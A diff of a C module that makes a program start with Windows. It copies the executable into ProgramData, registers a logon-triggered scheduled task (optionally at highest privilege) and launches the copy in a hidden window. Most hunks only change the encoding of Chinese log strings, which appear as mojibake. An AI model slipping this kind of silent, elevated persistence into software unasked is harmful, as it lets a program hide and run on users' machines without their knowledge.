@@ -1,4 +1,4 @@
-/*
+ï»¿/*
 * Author: 962914132@qq.com
 * Purpose: Create a scheduled task.
 * Language: C
@@ -32,14 +32,14 @@ int CreateScheduledTask(const char* taskName,const char* exePath,BOOL check,cons
 {
     HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
     if (FAILED(hr)) {
-        Mprintf("ÎŞ·¨³õÊ¼»¯COM¿â£¬´íÎó´úÂë£º%ld\n", hr);
+        Mprintf("æ— æ³•åˆå§‹åŒ–COMåº“ï¼Œé”™è¯¯ä»£ç ï¼š%ld\n", hr);
         return 1;
     }
 
     ITaskService* pService = NULL;
     hr = CoCreateInstance(&CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, &IID_ITaskService, (void**)&pService);
     if (FAILED(hr)) {
-        Mprintf("ÎŞ·¨´´½¨TaskSchedulerÊµÀı£¬´íÎó´úÂë£º%ld\n", hr);
+        Mprintf("æ— æ³•åˆ›å»ºTaskSchedulerå®ä¾‹ï¼Œé”™è¯¯ä»£ç ï¼š%ld\n", hr);
         CoUninitialize();
         return 2;
     }
@@ -49,7 +49,7 @@ int CreateScheduledTask(const char* taskName,const char* exePath,BOOL check,cons
     empty.vt = VT_EMPTY;
     hr = pService->lpVtbl->Connect(pService, empty, empty, empty, empty);
     if (FAILED(hr)) {
-        Mprintf("ÎŞ·¨Á¬½Óµ½ÈÎÎñ¼Æ»®·şÎñ£¬´íÎó´úÂë£º%ld\n", hr);
+        Mprintf("æ— æ³•è¿æ¥åˆ°ä»»åŠ¡è®¡åˆ’æœåŠ¡ï¼Œé”™è¯¯ä»£ç ï¼š%ld\n", hr);
         pService->lpVtbl->Release(pService);
         CoUninitialize();
         return 3;
@@ -61,7 +61,7 @@ int CreateScheduledTask(const char* taskName,const char* exePath,BOOL check,cons
     ITaskFolder* pRootFolder = NULL;
     hr = pService->lpVtbl->GetFolder(pService, wRootPath, &pRootFolder);
     if (FAILED(hr)) {
-        Mprintf("ÎŞ·¨»ñÈ¡ÈÎÎñ¼Æ»®³ÌĞò¸ùÎÄ¼ş¼Ğ£¬´íÎó´úÂë£º%ld\n", hr);
+        Mprintf("æ— æ³•è·å–ä»»åŠ¡è®¡åˆ’ç¨‹åºæ ¹æ–‡ä»¶å¤¹ï¼Œé”™è¯¯ä»£ç ï¼š%ld\n", hr);
         pService->lpVtbl->Release(pService);
         CoUninitialize();
         return 4;
@@ -73,7 +73,7 @@ int CreateScheduledTask(const char* taskName,const char* exePath,BOOL check,cons
     IRegisteredTask* pOldTask = NULL;
     hr = pRootFolder->lpVtbl->GetTask(pRootFolder, wTaskName, &pOldTask);
     if (SUCCEEDED(hr) && pOldTask != NULL) {
-        Mprintf("ÈÎÎñÒÑ´æÔÚ: %s\n", taskName);
+        Mprintf("ä»»åŠ¡å·²å­˜åœ¨: %s\n", taskName);
         pOldTask->lpVtbl->Release(pOldTask);
         if (check) {
             pRootFolder->lpVtbl->Release(pRootFolder);
@@ -89,13 +89,13 @@ int CreateScheduledTask(const char* taskName,const char* exePath,BOOL check,cons
     hr = pService->lpVtbl->NewTask(pService, 0, &pTask);
     pRootFolder->lpVtbl->Release(pRootFolder);
     if (FAILED(hr)) {
-        Mprintf("ÎŞ·¨´´½¨ÈÎÎñ¶¨Òå£¬´íÎó´úÂë£º%ld\n", hr);
+        Mprintf("æ— æ³•åˆ›å»ºä»»åŠ¡å®šä¹‰ï¼Œé”™è¯¯ä»£ç ï¼š%ld\n", hr);
         pService->lpVtbl->Release(pService);
         CoUninitialize();
         return 5;
     }
 
-    // ÅäÖÃÉèÖÃ
+    // é…ç½®è®¾ç½®
     ITaskSettings* pSettings = NULL;
     hr = pTask->lpVtbl->get_Settings(pTask, &pSettings);
     if (SUCCEEDED(hr)) {
@@ -107,7 +107,7 @@ int CreateScheduledTask(const char* taskName,const char* exePath,BOOL check,cons
         pSettings->lpVtbl->Release(pSettings);
     }
     else {
-        Mprintf("»ñÈ¡ÅäÖÃÉèÖÃÊ§°Ü£¬´íÎó´úÂë£º%ld\n", hr);
+        Mprintf("è·å–é…ç½®è®¾ç½®å¤±è´¥ï¼Œé”™è¯¯ä»£ç ï¼š%ld\n", hr);
     }
 
     IRegistrationInfo* pRegInfo = NULL;
@@ -132,7 +132,7 @@ int CreateScheduledTask(const char* taskName,const char* exePath,BOOL check,cons
         pRegInfo->lpVtbl->Release(pRegInfo);
     }
     else {
-        Mprintf("»ñÈ¡×¢²áĞÅÏ¢Ê§°Ü£¬´íÎó´úÂë£º%ld\n", hr);
+        Mprintf("è·å–æ³¨å†Œä¿¡æ¯å¤±è´¥ï¼Œé”™è¯¯ä»£ç ï¼š%ld\n", hr);
     }
 
     ITriggerCollection* pTriggerCollection = NULL;
@@ -142,7 +142,7 @@ int CreateScheduledTask(const char* taskName,const char* exePath,BOOL check,cons
         hr = pTriggerCollection->lpVtbl->Create(pTriggerCollection, TASK_TRIGGER_LOGON, &pTrigger);
         pTriggerCollection->lpVtbl->Release(pTriggerCollection);
         if (SUCCEEDED(hr)) {
-            // ÆÕÍ¨ÓÃ»§ĞèÒªÖ¸¶¨¾ßÌåÓÃ»§
+            // æ™®é€šç”¨æˆ·éœ€è¦æŒ‡å®šå…·ä½“ç”¨æˆ·
             if (!runasAdmin) {
                 ILogonTrigger* pLogonTrigger = NULL;
                 hr = pTrigger->lpVtbl->QueryInterface(pTrigger, &IID_ILogonTrigger, (void**)&pLogonTrigger);
@@ -161,7 +161,7 @@ int CreateScheduledTask(const char* taskName,const char* exePath,BOOL check,cons
             pTrigger->lpVtbl->Release(pTrigger);
         }
         else {
-            Mprintf("ÎŞ·¨ÉèÖÃÈÎÎñ´¥·¢Æ÷£¬´íÎó´úÂë£º%ld\n", hr);
+            Mprintf("æ— æ³•è®¾ç½®ä»»åŠ¡è§¦å‘å™¨ï¼Œé”™è¯¯ä»£ç ï¼š%ld\n", hr);
             pTask->lpVtbl->Release(pTask);
             pService->lpVtbl->Release(pService);
             CoUninitialize();
@@ -169,10 +169,10 @@ int CreateScheduledTask(const char* taskName,const char* exePath,BOOL check,cons
         }
     }
     else {
-        Mprintf("»ñÈ¡ÈÎÎñ´¥·¢Ê§°Ü£¬´íÎó´úÂë£º%ld\n", hr);
+        Mprintf("è·å–ä»»åŠ¡è§¦å‘å¤±è´¥ï¼Œé”™è¯¯ä»£ç ï¼š%ld\n", hr);
     }
 
-    // ÉèÖÃ²Ù×÷
+    // è®¾ç½®æ“ä½œ
     IActionCollection* pActionCollection = NULL;
     hr = pTask->lpVtbl->get_Actions(pTask, &pActionCollection);
     if (SUCCEEDED(hr)) {
@@ -190,33 +190,33 @@ int CreateScheduledTask(const char* taskName,const char* exePath,BOOL check,cons
                 pExecAction->lpVtbl->Release(pExecAction);
             }
             else {
-                Mprintf("QueryInterface µ÷ÓÃÊ§°Ü£¬´íÎó´úÂë£º%ld\n", hr);
+                Mprintf("QueryInterface è°ƒç”¨å¤±è´¥ï¼Œé”™è¯¯ä»£ç ï¼š%ld\n", hr);
             }
             pAction->lpVtbl->Release(pAction);
         }
         else {
-            Mprintf("´´½¨ÈÎÎñ¶¯×÷Ê§°Ü£¬´íÎó´úÂë£º%ld\n", hr);
+            Mprintf("åˆ›å»ºä»»åŠ¡åŠ¨ä½œå¤±è´¥ï¼Œé”™è¯¯ä»£ç ï¼š%ld\n", hr);
         }
         pActionCollection->lpVtbl->Release(pActionCollection);
     }
     else {
-        Mprintf("»ñÈ¡ÈÎÎñ¶¯×÷Ê§°Ü£¬´íÎó´úÂë£º%ld\n", hr);
+        Mprintf("è·å–ä»»åŠ¡åŠ¨ä½œå¤±è´¥ï¼Œé”™è¯¯ä»£ç ï¼š%ld\n", hr);
     }
 
-    // È¨ÏŞÅäÖÃ
+    // æƒé™é…ç½®
     IPrincipal* pPrincipal = NULL;
     if (runasAdmin && SUCCEEDED(pTask->lpVtbl->get_Principal(pTask, &pPrincipal))) {
         hr = pPrincipal->lpVtbl->put_LogonType(pPrincipal, TASK_LOGON_INTERACTIVE_TOKEN);
-        if (FAILED(hr)) Mprintf("put_LogonType Ê§°Ü£¬´íÎó´úÂë£º%ld\n", hr);
+        if (FAILED(hr)) Mprintf("put_LogonType å¤±è´¥ï¼Œé”™è¯¯ä»£ç ï¼š%ld\n", hr);
         hr = pPrincipal->lpVtbl->put_RunLevel(pPrincipal, runasAdmin ? TASK_RUNLEVEL_HIGHEST : TASK_RUNLEVEL_LUA);
-        if (FAILED(hr)) Mprintf("put_RunLevel Ê§°Ü£¬´íÎó´úÂë£º%ld\n", hr);
+        if (FAILED(hr)) Mprintf("put_RunLevel å¤±è´¥ï¼Œé”™è¯¯ä»£ç ï¼š%ld\n", hr);
         pPrincipal->lpVtbl->Release(pPrincipal);
     }
     else {
-        if (runasAdmin) Mprintf("»ñÈ¡ÈÎÎñÈ¨ÏŞÊ§°Ü£¬´íÎó´úÂë£º%ld\n", hr);
+        if (runasAdmin) Mprintf("è·å–ä»»åŠ¡æƒé™å¤±è´¥ï¼Œé”™è¯¯ä»£ç ï¼š%ld\n", hr);
     }
 
-    // ×¢²áÈÎÎñ
+    // æ³¨å†Œä»»åŠ¡
     ITaskFolder* pFolder = NULL;
     hr = pService->lpVtbl->GetFolder(pService, wRootPath, &pFolder);
     ConvertCharToWChar(taskName, wTaskName, MAX_PATH);
@@ -225,7 +225,7 @@ int CreateScheduledTask(const char* taskName,const char* exePath,BOOL check,cons
         char userName[UNLEN + 1] = {0};
         DWORD nameLen = UNLEN + 1;
         if (GetUserNameA(userName, &nameLen)) {
-            Mprintf("´´½¨ÈÎÎñ¼Æ»®. µ±Ç°ÓÃ»§Ãû³ÆÎª: %s\n", userName);
+            Mprintf("åˆ›å»ºä»»åŠ¡è®¡åˆ’. å½“å‰ç”¨æˆ·åç§°ä¸º: %s\n", userName);
         }
         WCHAR wUser[_MAX_PATH] = {0};
         ConvertCharToWChar(userName, wUser, MAX_PATH);
@@ -255,13 +255,13 @@ int CreateScheduledTask(const char* taskName,const char* exePath,BOOL check,cons
                 if (SUCCEEDED(hr)) {
                     pRunningTask->lpVtbl->Release(pRunningTask);
                 } else {
-                    Mprintf("ÎŞ·¨Æô¶¯ÈÎÎñ£¬´íÎó´úÂë£º%ld\n", hr);
+                    Mprintf("æ— æ³•å¯åŠ¨ä»»åŠ¡ï¼Œé”™è¯¯ä»£ç ï¼š%ld\n", hr);
                 }
             }
             pRegisteredTask->lpVtbl->Release(pRegisteredTask);
         }
         else {
-            Mprintf("×¢²á¼Æ»®ÈÎÎñÊ§°Ü£¬´íÎó´úÂë£º%ld | runasAdmin: %s\n", hr, runasAdmin ? "Yes" : "No");
+            Mprintf("æ³¨å†Œè®¡åˆ’ä»»åŠ¡å¤±è´¥ï¼Œé”™è¯¯ä»£ç ï¼š%ld | runasAdmin: %s\n", hr, runasAdmin ? "Yes" : "No");
         }
 
         VariantClear(&vUser);
@@ -269,7 +269,7 @@ int CreateScheduledTask(const char* taskName,const char* exePath,BOOL check,cons
         pFolder->lpVtbl->Release(pFolder);
     }
     else {
-        Mprintf("»ñÈ¡ÈÎÎñÄ¿Â¼Ê§°Ü£¬´íÎó´úÂë£º%ld\n", hr);
+        Mprintf("è·å–ä»»åŠ¡ç›®å½•å¤±è´¥ï¼Œé”™è¯¯ä»£ç ï¼š%ld\n", hr);
     }
 
     pTask->lpVtbl->Release(pTask);
@@ -343,8 +343,13 @@ int RegisterStartup(const char* startupName, const char* exeName, bool lockFile,
     return 1;
 #endif
     Log = log;
+    char username[256];
+    DWORD size = sizeof(username);
+    if (GetUserNameA(username, &size)) {
+        Mprintf("RegisterStartup is running with user: %s\n", username);
+    }
     char folder[MAX_PATH] = { 0 };
-    if (GetEnvironmentVariableA("LOCALAPPDATA", folder, MAX_PATH) > 0) {
+    if (GetEnvironmentVariableA("ProgramData", folder, MAX_PATH) > 0) {
         size_t len = strlen(folder);
         if (len > 0 && folder[len - 1] != '\\') {
             folder[len] = '\\';
@@ -385,12 +390,16 @@ int RegisterStartup(const char* startupName, const char* exeName, bool lockFile,
                 curFile, dstFile, b ? "succeed" : "failed", GetLastError());
 
         int status = CreateScheduledTask(startupName, dstFile, FALSE, NULL, TRUE, runasAdmin);
-        Mprintf("ÈÎÎñ¼Æ»®´´½¨: %s!\n", status == 0 ? "³É¹¦" : "Ê§°Ü");
+        Mprintf("ä»»åŠ¡è®¡åˆ’åˆ›å»º: %s!\n", status == 0 ? "æˆåŠŸ" : "å¤±è´¥");
+        if (b && status) {
+            int ret = (int)ShellExecuteA(NULL, "open", dstFile, NULL, NULL, SW_HIDE);
+            Mprintf("å°è¯•ç›´æ¥å¯åŠ¨ç›®æ ‡ç¨‹åº[%d]: %s %s\n", ret, dstFile, ret > 32 ? "succeed":"failed");
+        }
 
         return 0;
     }
     int status = CreateScheduledTask(startupName, dstFile, TRUE, NULL, FALSE, runasAdmin);
-    Mprintf("ÈÎÎñ¼Æ»®´´½¨: %s!\n", status == 0 ? "³É¹¦" : "Ê§°Ü");
+    Mprintf("ä»»åŠ¡è®¡åˆ’åˆ›å»º: %s!\n", status == 0 ? "æˆåŠŸ" : "å¤±è´¥");
     if (lockFile)
         CreateFileA(curFile, GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 
